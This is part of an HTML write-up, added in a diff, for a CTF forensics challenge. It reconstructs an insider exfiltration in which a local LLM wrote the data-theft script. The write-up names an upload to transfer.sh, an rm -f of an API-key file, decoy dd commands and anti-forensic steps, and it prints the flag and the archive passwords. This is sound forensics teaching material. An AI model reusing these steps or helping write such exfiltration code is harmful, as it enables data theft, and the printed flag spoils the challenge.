+        <div class="out">BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}</div>
+      </div>
+      <p>
+        <code>solve.py</code> finds it without being told where to look: it base64-decodes every
+        long token in every recovered file and keeps whatever contains <code>FlagY{</code>.
+      </p>
+    </section>
+
+    <section id="anti">
+      <div class="step">Step 6 &middot; Cleanup</div>
+      <h2>Five anti-forensic moves, none of which worked</h2>
+      <p>Line 38 of the prompt history was acted on. Here is what was tried, and why the evidence survived it.</p>
+      <div class="tablewrap">
+        <table>
+          <thead><tr><th>Technique</th><th>Evidence</th><th>Why it failed</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>Shell history wiped</td>
+              <td><code>~/.bash_history</code> is <strong>0 bytes</strong></td>
+              <td><code>auditd</code> was logging <code>execve</code> under a rule keyed <code>exec_log</code>. Clearing bash&rsquo;s own file removes one copy of the record, not the record.</td>
+            </tr>
+            <tr>
+              <td>Script &ldquo;deleted&rdquo;</td>
+              <td><code>mv</code> to <code>~/.local/share/Trash/files/</code></td>
+              <td>A Trash move is not a delete. The file, its original path and its deletion time all persist &mdash; and that timestamp made it the standout item in a 59-entry Trash.</td>
+            </tr>
+            <tr>
+              <td>Archive disguised</td>
+              <td><code>~/.cache/fontconfig/session.zip</code></td>
+              <td>Font caches hold <code>.cache</code> files, not zips. One file of the wrong type in a well-known directory is louder than an odd filename somewhere unremarkable.</td>
+            </tr>
+            <tr>
+              <td>Venv hidden</td>
+              <td><code>~/.local/share/.venv</code> (dotted)</td>
+              <td>pip&rsquo;s HTTP cache kept the downloaded wheels regardless, naming <code>pyzipper</code> and <code>requests</code> outright.</td>
+            </tr>
+            <tr>
+              <td>Decoy files</td>
+              <td>8 &times; <code>dd if=/dev/urandom</code> into <code>/tmp</code> at 13:00:48 UTC, plus 3 stubs</td>
+              <td>All eight created in the same second, every one <code>bs=1024</code> with a round count &mdash; and each <code>dd</code> command line sits in the audit log with its exact output path.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>
+        The decoys are named to bait the first grep an analyst runs:
+        <code>.config_backup_old.tar.gz</code>, <code>.mozilla_cache.dat</code>,
+        <code>.pip-cache-a8f3b2.tmp</code>, <code>.wget-download-c4e2f1.tmp</code>,
+        <code>journal-upload.tmp</code>, <code>core.python3.1234.1781614848</code>. Eight are pure
+        <code>/dev/urandom</code>; the other three are jokes small enough to <code>cat</code> &mdash;
+        <code>.viminfo.tmp</code> is the seventeen bytes <code>temporary buffer</code>, and
+        <code>__pycache__/tempmod.cpython-312.pyc</code> is nine bytes reading <code>compiled</code>,
+        where a real <code>.pyc</code> starts with a magic number. You do not have to guess whether
+        they matter. The audit log says they were manufactured.
+      </p>
+      <div class="note">
+        <span class="tag">A timestamp that does not survive scrutiny</span>
+        <p>
+          <code>session.zip</code>&rsquo;s own mtime and all five member timestamps read
+          <strong>2026-06-20, ~15:42&ndash;15:45 local</strong> &mdash; four days after the incident.
+          But the containing directory <code>~/.cache/fontconfig/</code> has mtime
+          <strong>2026-06-16 12:59:43 UTC</strong>, matching the audit log&rsquo;s
+          <code>python cache_mgr.py</code> to the second.
+        </p>
+        <p>
+          Directory mtimes update on file creation and are not what a naive timestomp touches, so the
+          directory and the audit log are the trustworthy pair. It changes nothing about the
+          conclusion &mdash; but a report quoting the zip&rsquo;s internal dates as the time of the
+          offence would be quoting forged data.
+        </p>
+      </div>
+    </section>
+
+    <section id="timeline">
+      <div class="step">Reconstruction</div>
+      <h2>Sixty-five minutes</h2>
+      <p>
+        All times UTC (local is CEST, UTC+2). Sources: the audit log, the Ollama journal, filesystem
+        mtimes and the Trash metadata.
+      </p>
+      <div class="tablewrap">
+        <table>
+          <thead><tr><th>Time</th><th>Source</th><th>Event</th></tr></thead>
+          <tbody>
+            <tr><td class="t">11:54:32</td><td>audit + mtime</td><td>bare <code>python3</code>; the four <code>/data/reports/*.csv</code> all carry this exact mtime</td></tr>
+            <tr><td class="t">11:54:37</td><td>audit</td><td><code>curl -fsSL https://ollama.com/install.sh</code></td></tr>
+            <tr><td class="t">11:57:30</td><td>audit</td><td><code>useradd&hellip;ollama</code>; <code>ollama.service</code> written and enabled</td></tr>
+            <tr><td class="t">11:57:32</td><td>journal</td><td><code>ollama serve</code> &mdash; listening on <code>127.0.0.1:11434</code>, v0.30.8</td></tr>
+            <tr><td class="t">11:58:32</td><td>audit</td><td><code>ollama pull tinyllama</code></td></tr>
+            <tr><td class="t">11:59:58</td><td>audit</td><td><code>ollama run tinyllama</code></td></tr>
+            <tr><td class="t">12:01&ndash;12:45</td><td>journal</td><td><strong>17 &times; <code>POST /api/chat</code></strong> &mdash; the entire conversation</td></tr>
+            <tr><td class="t">12:55&ndash;12:57</td><td>audit + mtime</td><td><code>nano</code>/<code>cat</code> on <code>~/.ollama/history</code>; file left at 64 prompts</td></tr>
+            <tr><td class="t">12:58:20</td><td>audit</td><td><code>python3 -m venv ~/.local/share/.venv</code> (hidden)</td></tr>
+            <tr><td class="t">12:59:37</td><td>mtime</td><td><code>cache_mgr.py</code> written</td></tr>
+            <tr class="key"><td class="t">12:59:43</td><td>audit</td><td><strong>script runs</strong> &mdash; 5 CSVs archived to <code>~/.cache/fontconfig/session.zip</code>, <code>PUT</code> to transfer.sh</td></tr>
+            <tr class="key"><td class="t">13:00:43</td><td>audit</td><td><strong><code>rm -f /data/reports/internal_api_keys.csv</code></strong> &mdash; source destroyed</td></tr>
+            <tr><td class="t">13:00:48</td><td>audit</td><td>8 &times; <code>dd if=/dev/urandom</code> &rarr; decoys in <code>/tmp</code></td></tr>
+            <tr><td class="t">13:02:46</td><td>trashinfo</td><td><code>cache_mgr.py</code> moved to Trash</td></tr>
+            <tr><td class="t">13:06:22</td><td>audit</td><td><code>sudo bash /tmp/collect_final.sh</code> &mdash; triage collection begins</td></tr>
+            <tr><td class="t">13:07:31</td><td>&mdash;</td><td>package sealed; <code>~/.bash_history</code> is 0 bytes</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>
+        Sixty-five minutes from <code>curl | sh</code> to a staged, encrypted archive on disk. Sixty
+        seconds from the script running to the source data being destroyed.
+      </p>
+    </section>
+
+    <section id="ioc">
+      <div class="step">Reference</div>
+      <h2>Indicators</h2>
+      <div class="tablewrap">
+        <table>
+          <thead><tr><th>Type</th><th>Value</th></tr></thead>
+          <tbody>
+            <tr><td>Tool</td><td>Ollama 0.30.8, model <code>tinyllama</code>, <code>127.0.0.1:11434</code></td></tr>
+            <tr><td>Script</td><td><code>/home/dwright/cache_mgr.py</code> &rarr; <code>~/.local/share/Trash/files/cache_mgr.py</code></td></tr>
+            <tr><td>Script SHA-256</td><td><code>41e11c805040885832b00d97967b8c6c8faa2776c82c24212297104e36483f24</code></td></tr>
+            <tr><td>Staged archive</td><td><code>/home/dwright/.cache/fontconfig/session.zip</code> (291,118 B)</td></tr>
+            <tr><td>Archive SHA-256</td><td><code>67cc96630e8ab5112ec25c2467481d361c7bcc2373ec0ec5da0417c26506b23d</code></td></tr>
+            <tr><td>Exfil destination</td><td><code>https://transfer.sh/backup.zip</code> (HTTP <code>PUT</code>, 30 s timeout)</td></tr>
+            <tr><td>Passphrase</td><td><code>Gr33nF0x42!D1amond</code> &mdash; dictated to the model in cleartext</td></tr>
+            <tr><td>Archive password</td><td><code>d571fe77618f54b7fca8</code> = <code>blake2b(passphrase, 32).hexdigest()[:20]</code></td></tr>
+            <tr><td>Hidden venv</td><td><code>/home/dwright/.local/share/.venv</code> &mdash; pyzipper, requests, pycryptodomex</td></tr>
+            <tr><td>Decoys</td><td>11 files in <code>/tmp</code>, 8 of them <code>dd if=/dev/urandom</code> at 13:00:48 UTC</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>
+        <strong>ATT&amp;CK:</strong> T1119 automated collection &rarr; T1074.001 local staging &rarr;
+        T1560.001 archive via utility &rarr; T1567.002 exfiltration to web service &rarr; T1070.003
+        clear command history &rarr; T1070.004 file deletion &rarr; T1036 masquerading.
+      </p>
+      <div class="note">
+        <span class="tag">On the proxy alert</span>
+        <p>
+          Inside this package, <code>transfer.sh</code> appears in exactly one place: the recovered
+          script. There is no proxy log, no netflow, no HTTP cache artefact. The <em>attempt</em> is
+          established by the script and the audit log; the alert itself is context from the brief
+          rather than something the evidence proves. Whether the <code>PUT</code> ever succeeded
+          cannot be determined here at all &mdash; the script swallows every exception the upload
+          raises.
+        </p>
+      </div>
+    </section>
+
+    <section id="take">
+      <div class="step">Closing</div>
+      <h2>What this case is actually about</h2>
+      <h3>A local model is not a forensic void</h3>
+      <p>
+        The entire premise of running Ollama on a workstation is that the conversation never leaves
+        the machine: no provider transcript, no DLP on the wire, nothing for legal to subpoena. That
+        is true, and it is exactly why the artefacts are <em>better</em>.
+        <code>~/.ollama/history</code> is a plaintext, user-readable record of every prompt, with no
+        retention policy and no redaction. A cloud provider would have given you a subpoena and a
+        metadata dump. The local install gave you the words.
+      </p>
+      <h3>Prompt histories are intent, and intent is the hard part</h3>
+      <p>
+        The technical acts here are individually innocent and individually deniable: write a zip,
+        upload a file, clear a history. What is not deniable is the <em>sequence</em>, in the
+        user&rsquo;s own words, timestamped, in one session. No amount of binary analysis produces
+        that. It is the difference between proving what happened and proving why.
+      </p>
+      <h3>Read the code, not the request</h3>
+      <p>
+        The SHA-256 prompt works as a trap because it is a reasonable thing to believe. The user
+        asked for SHA-256; the model wrote BLAKE2b; nobody checked. A chat log is a statement of
+        intent and nothing more &mdash; when the recovered artefact contradicts the prompt that
+        produced it, the artefact is the fact.
+      </p>
+      <h3>For the defensive side</h3>
+      <p>
+        Three controls would each have caught this independently: egress filtering on public
+        file-sharing hosts, DLP on <code>/data/reports</code> reads by non-service accounts, and
+        &mdash; the cheap one &mdash; treating local LLM installs as a monitored category rather than
+        shadow IT. Ollama installs with a <code>curl | sh</code> from a normal user account into
+        <code>/usr/local</code>, registers a systemd unit, and never touches the package manager. It
+        is invisible to <code>dpkg</code>, invisible to <code>pip</code>, and it is where the
+        confession ended up.
+      </p>
+    </section>
+
+    <footer>
+      <span>Black Hat MEA CTF Qualification 2026</span>
+      <span>Forensics &middot; Whisper</span>
+      <span>Solvers: <code>solve/triage.py</code> &middot; <code>solve/wzaes.py</code> &middot; <code>solve/solve.py</code></span>
+      <span>stdlib only &mdash; no pip install</span>
+    </footer>
+
+  </main>
+</div>
